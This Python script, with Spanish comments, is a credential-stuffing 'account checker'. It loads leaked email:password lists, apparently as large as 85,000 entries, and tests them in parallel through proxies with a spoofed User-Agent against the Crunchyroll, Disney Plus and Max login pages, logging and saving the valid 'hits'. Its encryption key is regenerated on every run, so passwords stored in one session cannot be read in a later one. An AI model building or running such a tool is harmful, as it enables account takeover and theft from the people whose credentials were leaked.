import requests
import os
import time
import re
import logging
from tqdm import tqdm
from concurrent.futures import ThreadPoolExecutor
from cryptography.fernet import Fernet

# Configuración de logs
logging.basicConfig(filename='checker_log.txt', level=logging.INFO, format='%(asctime)s - %(message)s')

# Clave para cifrado y descifrado de contraseñas
KEY = Fernet.generate_key()
cipher = Fernet(KEY)

# Funciones de diseño visual
def print_green(text): print("\033[92m{}\033[00m".format(text))
def print_red(text): print("\033[91m{}\033[00m".format(text))
def print_yellow(text): print("\033[93m{}\033[00m".format(text))
def print_cyan(text): print("\033[96m{}\033[00m".format(text))
def print_separator(): print("\033[90m" + "="*40 + "\033[00m")

# Función para validar formato de email
def is_valid_email(email):
    pattern = r'^[\w\.-]+@[\w\.-]+\.\w+$'
    return re.match(pattern, email)

# Cifrar y descifrar contraseñas
def encrypt_password(password):
    return cipher.encrypt(password.encode()).decode()

def decrypt_password(encrypted_password):
    return cipher.decrypt(encrypted_password.encode()).decode()

# Función para agregar cuentas al archivo desde otro archivo
def add_accounts_from_file(input_filename, output_filename):
    """
    Lee cuentas desde un archivo y las agrega al archivo 'accounts.txt' encriptando las contraseñas.
    """
    if not os.path.exists(input_filename):
        print_red(f"El archivo {input_filename} no existe.")
        return
    
    print_cyan(f"Leyendo cuentas desde {input_filename}...")
    
    with open(input_filename, 'r') as input_file, open(output_filename, 'a') as output_file:
        for line in tqdm(input_file, desc="Agregando cuentas", ncols=100):
            line = line.strip()
            if ':' in line:
                email, password = line.split(':')
                if is_valid_email(email):
                    encrypted_password = encrypt_password(password)
                    output_file.write(f"{email}:{encrypted_password}\n")
                else:
                    print_red(f"Email inválido: {email}")
                    logging.info(f"Email inválido: {email}")
            else:
                print_red(f"Formato incorrecto: {line}")
                logging.info(f"Formato incorrecto: {line}")

    print_green(f"Todas las cuentas se han añadido a {output_filename}.")

# Función para chequear las cuentas con exponential backoff
def check_account(session, email, password, url, headers=None, proxies=None, timeout=10, retries=3):
    for attempt in range(retries):
        try:
            payload = {'email': email, 'password': password}
            response = session.post(url, data=payload, headers=headers, proxies=proxies, timeout=timeout)

            if response.status_code == 200 and "success" in response.text:
                return True
            elif response.status_code != 200:
                print(f"Error en la solicitud: {response.status_code}")
            return False
        except requests.exceptions.RequestException as e:
            wait_time = 2 ** attempt  # Exponential backoff
            print(f"Error al realizar la solicitud: {e} (Intento {attempt + 1} de {retries}). Esperando {wait_time} segundos.")
            time.sleep(wait_time)
    return False

def read_accounts_from_file(filename):
    if not os.path.exists(filename):
        print(f"El archivo {filename} no existe. Creando archivo vacío.")
        open(filename, 'w').close()
        return []
    accounts = []
    with open(filename, 'r') as f:
        for line in f:
            try:
                email, encrypted_password = line.strip().split(':')
                password = decrypt_password(encrypted_password)
                if is_valid_email(email):
                    accounts.append((email, password))
                else:
                    print(f"Email inválido: {email}")
                    logging.info(f"Email inválido: {email}")
            except ValueError:
                print(f"Formato incorrecto en la línea: {line.strip()}")
                logging.info(f"Formato incorrecto en la línea: {line.strip()}")
    return accounts

def write_valid_accounts_to_file(filename, accounts):
    with open(filename, 'w') as f:
        for email, password in accounts:
            encrypted_password = encrypt_password(password)
            f.write(f"{email}:{encrypted_password}\n")

# Función para manejar proxies dinámicos
def get_proxy():
    # Aquí puedes agregar una lista de proxies o usar un servicio de proxies rotativos
    return {
        "http": "http://proxy.example.com:8080",
        "https": "http://proxy.example.com:8080"
    }

# Verificación de cuentas usando multithreading
def check_accounts():
    accounts_file = 'accounts.txt'
    valid_accounts_file = 'valid_accounts.txt'
    urls = {
        'Crunchyroll': 'https://sso.crunchyroll.com/es/authorize?client_id=noaihdevm_6iyg0a8l0q&redirect_uri=https%3A%2F%2Fwww.crunchyroll.com%2Fcallback&response_type=cookie&state=%2F',
        'Disney Plus': 'https://www.disneyplus.com/login',
        'Max': 'https://auth.max.com/login'
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    session = requests.Session()
    accounts = read_accounts_from_file(accounts_file)
    valid_accounts = []
    hit_count = 0
    error_count = 0

    print_cyan("\nPlataformas disponibles:")
    for key in urls:
        print(f"- {key}")
    platform = input("Selecciona la plataforma para verificar cuentas (Crunchyroll, Disney Plus, Max): ")
    url = urls.get(platform)

    if not url:
        print_red("Plataforma no válida. Selecciona una de las opciones disponibles.")
        return

    proxies = get_proxy()

    def process_account(account):
        nonlocal hit_count, error_count
        email, password = account
        account_str = f"{email}:{password}"
        print_separator()
        print_yellow(f"Chequeando cuenta en {platform}: {account_str}")
        
        if check_account(session, email, password, url, headers=headers, proxies=proxies):
            valid_accounts.append((email, password))
            print_green(f"¡HIT! Cuenta válida: {account_str}")
            logging.info(f"HIT: {account_str}")
            hit_count += 1
        else:
            print_red(f"ERROR: Cuenta inválida: {account_str}")
            logging.info(f"ERROR: {account_str}")
            error_count += 1
        time.sleep(1)  # Evitar bloqueos

    # Multithreading para mejorar la velocidad de verificación
    with ThreadPoolExecutor(max_workers=5) as executor:
        list(tqdm(executor.map(process_account, accounts), desc="Verificando cuentas", ncols=100))

    write_valid_accounts_to_file(valid_accounts_file, valid_accounts)

    print_separator()
    print_cyan(f"Proceso completado. Total de cuentas verificadas: {len(accounts)}")
    print_green(f"HIT (Cuentas válidas): {hit_count}")
    print_red(f"ERROR (Cuentas inválidas): {error_count}")
    print_green(f"Revisa '{valid_accounts_file}' para ver las cuentas válidas.")
    print_separator()

# Función para visualizar cuentas válidas
def view_valid_accounts():
    valid_accounts_file = 'valid_accounts.txt'
    if not os.path.exists(valid_accounts_file):
        print_red(f"El archivo {valid_accounts_file} no existe.")
        return

    print_cyan(f"\nCuentas validadas ({valid_accounts_file}):")
    with open(valid_accounts_file, 'r') as f:
        for line in f:
            print_green(line.strip())

# Menú principal
def menu():
    while True:
        print_separator()
        print_cyan("Menú de opciones:")
        print_yellow("1. Comenzar a chequear cuentas")
        print_yellow("2. Detener proceso")
        print_yellow("3. Agregar lista de cuentas")
        print_yellow("4. Ver lista de cuentas validadas")
        print_yellow("5. Reiniciar el código")
        print_yellow("0. Salir")
        print_separator()

        option = input("Selecciona una opción: ")

        if option == '1':
            check_accounts()
        elif option == '2':
            print_red("Proceso detenido.")
            break
        elif option == '3':
            input_filename = '1.txt'  # Archivo con 85,000 cuentas
            output_filename = 'accounts.txt'           # Archivo donde se agregarán las cuentas cifradas
            add_accounts_from_file(input_filename, output_filename)
        elif option == '4':
            view_valid_accounts()
        elif option == '5':
            print_yellow("Reiniciando el código...")
            menu()
        elif option == '0':
            print_green("Saliendo...")
            break
        else:
            print_red("Opción inválida. Por favor, selecciona una opción válida.")

if __name__ == '__main__':
    menu()